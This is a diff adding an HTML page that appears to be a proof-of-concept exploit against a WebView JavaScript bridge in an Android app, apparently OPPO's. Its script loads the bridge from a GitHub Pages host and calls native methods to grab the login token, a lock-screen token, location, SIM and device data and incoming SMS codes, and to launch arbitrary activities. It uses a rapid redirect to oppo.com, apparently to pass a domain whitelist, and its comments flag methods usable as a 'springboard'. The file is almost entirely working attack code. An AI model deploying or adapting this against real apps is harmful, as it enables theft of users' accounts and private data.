@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <meta name='viewport' content='width=device-width, target-densitydpi=device-dpi, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no' />
+        <script src="https://carrykingo.github.io/Webviewtest/RainbowBridge.js" type="text/javascript"></script>
+    </head>
+    <body>
+        <script>
+	function gotoWhiteUrl(){
+		top.location.href = "https://www.oppo.com";
+    }
+	
+	
+	//以下为LoanMarketNativeMethod类调用
+	function getDeviceInfo(){
+		RainbowBridge.callMethod('LoanMarketNativeMethod','getDeviceInfo',{},function(msg){alert(JSON.stringify(msg))});
+	}
+	
+	//启用面部识别
+	function onFaceDetect(){
+		window.android.callCommonMethod("rainbow://LoanMarketNativeMethod/onFaceDetect?{}");
+	}
+	
+	//选个手机号
+	function pickContact(){
+		window.android.callCommonMethod("rainbow://LoanMarketNativeMethod/pickContact?{}");
+	}
+	
+	//以下为RechargeNativeMethod类调用
+	//拉起拨号
+	function dial(){
+		window.android.callCommonMethod("rainbow://RechargeNativeMethod/dial?{'tel':'10086'}");
+	}
+	
+	function controlNativeTitle(){
+		window.android.callCommonMethod("rainbow://JSCommondMethod:2441591/controlNativeTitle?{\"isShow\":\"true\",\"statusBarColor\":\"ff0000\"}");
+	}
+	
+	//复制
+	function copyCode(){
+		window.android.callCommonMethod("rainbow://JSCommondMethod/copyCode?{\"code\":\"10086\"}");
+	}
+	
+	function callCommonMethod4(){
+		window.android.callCommonMethod("rainbow://JSCommondMethod/decryptTicketNo?{\"ticketNo\":\"10086\"}");
+	}
+	
+	//打开拨号界面
+	function dialPhoneNumber(){
+		window.android.callCommonMethod("rainbow://JSCommondMethod/dialPhoneNumber?{\"phoneNumber\":\"10086\"}");
+	}
+	
+	//加密
+	function encryptQid(){
+		RainbowBridge.callMethod('JSCommondMethod','encryptQid',{'qid':'10086'},function(msg){alert(JSON.stringify(msg))});
+	}
+	
+	//获取锁屏token
+	function getCheckBindScreenPassToken(){
+		RainbowBridge.callMethod('JSCommondMethod','getCheckBindScreenPassToken',{'businessCode':'BIND_SCREEN_PASS'},function(msg){alert(JSON.stringify(msg))});
+	}
+	
+	//获取设备信息
+	function getClientContext(){
+		RainbowBridge.callMethod('JSCommondMethod','getClientContext',{},function(msg){alert(JSON.stringify(msg))});
+	}
+	
+	//获取位置
+	function getClientLocation(){
+		RainbowBridge.callMethod('JSCommondMethod','getClientLocation',{'type':''},function(msg){alert(JSON.stringify(msg))});
+	}
+	//获取pushid
+	function getPushRegId(){
+		RainbowBridge.callMethod('JSCommondMethod','getPushRegId',{},function(msg){alert(JSON.stringify(msg))});
+	}
+	
+	//获取siminfo
+	function getSimInfo(){
+		RainbowBridge.callMethod('JSCommondMethod','getSimInfo',{},function(msg){alert(JSON.stringify(msg))});
+	}
+
+	//获取token
+	function getToken(){
+            
+        RainbowBridge.callMethod('JSCommondMethod','getToken',{},function(msg){alert(JSON.stringify(msg))});
+            
+    }
+	
+	//通知事件
+	function h5NotifyNativeEvent(){
+		window.android.callCommonMethod("rainbow://JSCommondMethod/h5NotifyNativeEvent/?{\"event_type\":\"event_type_refresh_locallife_data\"}");
+	}
+	
+	//launchAnyWthere,这个还可以深入挖掘。。。
+	function launchActivity(){
+		window.android.callCommonMethod("rainbow://JSCommondMethod/launchActivity?{\"linkDetail\":\"{\"appVersion\":\"\",\"enter_from\":\"\",\"linkTyp\":\"\",\"linkUrl\":\"\",\"osVersion\":\"\",\"packageName\":\"\"}\",\"downloadUrl\":\"\"}");
+	}
+	
+	//设备退出
+	function logoutDevice(){
+		window.android.callCommonMethod("rainbow://JSCommondMethod/logoutDevice?{\"imei\":\"event_type_refresh_locallife_data\",\"encryptToken\":\"deviceType\",\"\":\"\"}");
+	}
+	
+	//修改密码
+	function modifyPassword(){
+		window.android.callCommonMethod("rainbow://JSCommondMethod/modifyPassword?{}");
+	}
+	
+	//自动接收验证码
+	function onStartSmsCode(){
+		RainbowBridge.callMethod('JSCommondMethod','onStartSmsCode',{'smsLenght':6},function(msg){alert(JSON.stringify(msg))});
+	}
+	
+	//打开浏览器加载任意地址
+	function openBrowser(){
+		window.android.callCommonMethod("rainbow://JSCommondMethod/openBrowser?{'url':'https://www.baidu.com'}");
+	}
+	
+	//打开浏览器加载任意地址
+	function reqLogin(){
+		window.android.callCommonMethod("rainbow://JSCommondMethod/reqLogin?{}");
+	}
+	
+	//打开任意注意，可作为跳板使用
+	function startActivity(){
+		window.android.callCommonMethod("rainbow://JSCommondMethod/startActivity?{'action':'xxx','pkgName':'xxx','extra':'{'':''}'}");
+	}
+	
+	//打开任意注意，可作为跳板使用
+	function startReSignIn(){
+		window.android.callCommonMethod("rainbow://JSCommondMethod/startReSignIn?{}");
+	}
+	
+	
+
+
+
+	setInterval(gotoWhiteUrl,5)
+	setTimeout(getToken,1000)
+
+	</script>
+    </body>
+</html>
